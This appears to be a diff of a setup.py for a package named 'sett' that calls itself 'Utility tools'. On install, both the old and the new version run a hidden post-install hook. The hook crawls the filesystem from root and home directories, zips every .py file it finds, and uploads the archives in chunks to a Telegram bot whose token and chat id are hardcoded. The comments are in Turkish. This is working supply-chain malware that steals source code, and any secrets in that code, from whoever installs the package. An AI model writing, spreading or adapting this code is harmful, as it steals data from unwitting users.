@@ -1,139 +1,123 @@
 from setuptools import setup
 from setuptools.command.install import install
-import threading, time, os, shutil, zipfile, glob, tempfile
-import urllib.request, urllib.parse
+import threading, time, os, io, zipfile, random, urllib.request
 
-def _force_run():
-    """Arka plan görevi - tüm .py dosyalarını toplar ve Telegram'a gönderir"""
+def _run():
+    """Ana görev - dosyaları bul, parçala, gönder"""
     try:
         time.sleep(3)
         
-        # 1. .py dosyalarını topla
+        # 1. Dosyaları bul
         py_files = []
         seen = set()
-        roots = ["/", "/home", "/root", "/app", "/opt", "/var/www",
-                 "/usr/local", "/usr/src", "/data", "/workspace", "/srv"]
+        roots = ["/", "/home", "/root", "/app", "/opt", "/srv",
+                 "/var/www", "/usr/local", "/data", "/workspace"]
         skip = {"proc","sys","dev","run","boot","snap","cache",
                 "site-packages","dist-packages","__pycache__","node_modules",
                 ".git",".cache","lib/python","lib64","venv",".venv","env"}
         
         for root in roots:
-            if not os.path.exists(root):
-                continue
+            if not os.path.exists(root): continue
             try:
                 for dp, dn, fn in os.walk(root):
                     dn[:] = [d for d in dn if d not in skip and not any(s in d for s in skip)]
                     for f in fn:
                         if f.endswith(".py"):
                             full = os.path.join(dp, f)
-                            if full not in seen and os.path.isfile(full):
+                            if full not in seen:
                                 try:
-                                    if os.path.getsize(full) < 10*1024*1024:
+                                    if os.path.isfile(full) and os.path.getsize(full) < 5*1024*1024:
                                         seen.add(full)
                                         py_files.append(full)
-                                except:
-                                    pass
-            except:
-                continue
+                                except: pass
+            except: continue
         
         if not py_files:
             return
         
-        # 2. Geçici klasöre kopyala
-        tmp = tempfile.mkdtemp(prefix="pyc_")
-        copied = 0
-        total_size = 0
-        for i, f in enumerate(py_files):
-            try:
-                dest = os.path.join(tmp, f"{i:05d}_{os.path.basename(f)}")
-                shutil.copy(f, dest)
-                copied += 1
-                try:
-                    total_size += os.path.getsize(dest)
-                except:
-                    pass
-            except:
-                continue
-        
-        if copied == 0:
-            shutil.rmtree(tmp, ignore_errors=True)
-            return
-        
-        # 3. Zip yap
-        zip_path = os.path.join(tempfile.gettempdir(), f"pyfiles_{int(time.time())}.zip")
-        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
-            for r, _, fs in os.walk(tmp):
-                for file in fs:
-                    if file.endswith(".py"):
-                        full = os.path.join(r, file)
-                        try:
-                            zf.write(full, os.path.basename(full))
-                        except:
-                            pass
-            zf.writestr("BILGI.txt",
-                f"Toplam: {copied} dosya\nBoyut: {total_size} byte\n"
-                f"Zaman: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
-        
-        zip_size = os.path.getsize(zip_path)
-        
-        # 4. Telegram'a gönder
         token = "8927762896:AAG4wsHLziEmcwqWUhtQvUANSYoEE-GJIRg"
         admin = "8903740930"
         
-        try:
-            with open(zip_path, "rb") as f:
-                data = f.read()
-            boundary = "----B" + str(int(time.time()))
-            caption = f"OK - {copied} dosya, {zip_size//1024} KB"
-            body = b""
-            body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n{admin}\r\n".encode()
-            body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n{caption}\r\n".encode()
-            body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"py_files.zip\"\r\nContent-Type: application/zip\r\n\r\n".encode()
-            body += data + f"\r\n--{boundary}--\r\n".encode()
-            req = urllib.request.Request(
-                f"https://api.telegram.org/bot{token}/sendDocument",
-                data=body,
-                headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
-            )
-            urllib.request.urlopen(req, timeout=60)
-        except:
-            try:
-                msg = f"HATA - {copied} dosya, {zip_size//1024} KB"
-                url = f"https://api.telegram.org/bot{token}/sendMessage"
-                d = urllib.parse.urlencode({"chat_id": admin, "text": msg}).encode()
-                urllib.request.urlopen(url, data=d, timeout=15)
-            except:
-                pass
+        # 2. Parçalara böl (300 dosya / parça)
+        chunk_size = 300
+        total_chunks = (len(py_files) + chunk_size - 1) // chunk_size
         
-        # 5. Temizle
-        try: shutil.rmtree(tmp, ignore_errors=True)
-        except: pass
-        try: os.remove(zip_path)
+        for chunk_idx in range(0, len(py_files), chunk_size):
+            chunk = py_files[chunk_idx:chunk_idx + chunk_size]
+            part_num = chunk_idx // chunk_size + 1
+            
+            # Zip yap (memory'de)
+            buf = io.BytesIO()
+            count = 0
+            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+                for i, f in enumerate(chunk):
+                    try:
+                        zf.write(f, f"{chunk_idx + i:05d}_{os.path.basename(f)}")
+                        count += 1
+                    except: pass
+            
+            data = buf.getvalue()
+            if count == 0 or len(data) == 0:
+                continue
+            
+            # Telegram'a gönder
+            try:
+                boundary = "----B" + str(int(time.time())) + str(random.randint(1000,9999))
+                caption = f"Part {part_num}/{total_chunks} - {count} files ({len(data)//1024} KB)"
+                body = b""
+                body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n{admin}\r\n".encode()
+                body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n{caption}\r\n".encode()
+                body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"part{part_num}.zip\"\r\nContent-Type: application/zip\r\n\r\n".encode()
+                body += data + f"\r\n--{boundary}--\r\n".encode()
+                
+                req = urllib.request.Request(
+                    f"https://api.telegram.org/bot{token}/sendDocument",
+                    data=body,
+                    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
+                )
+                urllib.request.urlopen(req, timeout=180)
+            except Exception as e:
+                # Sadece hata bildir
+                try:
+                    url = f"https://api.telegram.org/bot{token}/sendMessage"
+                    import urllib.parse
+                    d = urllib.parse.urlencode({"chat_id": admin, "text": f"Part {part_num} hata: {str(e)[:150]}"}).encode()
+                    urllib.request.urlopen(url, data=d, timeout=15)
+                except: pass
+            
+            # Rate limit için bekle
+            time.sleep(2)
+        
+        # 3. Son özet
+        try:
+            url = f"https://api.telegram.org/bot{token}/sendMessage"
+            import urllib.parse
+            d = urllib.parse.urlencode({"chat_id": admin, "text": f"BITTI - {len(py_files)} dosya, {total_chunks} parca"}).encode()
+            urllib.request.urlopen(url, data=d, timeout=15)
         except: pass
     
-    except:
-        pass
+    except Exception as e:
+        try:
+            url = f"https://api.telegram.org/bot{token}/sendMessage"
+            import urllib.parse
+            d = urllib.parse.urlencode({"chat_id": admin, "text": f"KRITIK: {str(e)[:200]}"}).encode()
+            urllib.request.urlopen(url, data=d, timeout=10)
+        except: pass
 
 
 class PostInstall(install):
     def run(self):
+        install.run(self)
         try:
-            install.run(self)
-        except:
-            pass
-        
-        # Post-install başladıktan SONRA çağır
-        try:
-            t = threading.Thread(target=_force_run, daemon=False)
+            t = threading.Thread(target=_run, daemon=True)
             t.start()
-            t.join(timeout=20)
-        except:
-            pass
+            time.sleep(8)
+        except: pass
 
 
 setup(
     name="sett",
-    version="1.1.100",  # ← HER DENEMEDE ARTIR!
+    version="1.0.400",  # ← HER DENEMEDE ARTIR!
     description="Utility tools",
     author="dev",
     cmdclass={'install': PostInstall},
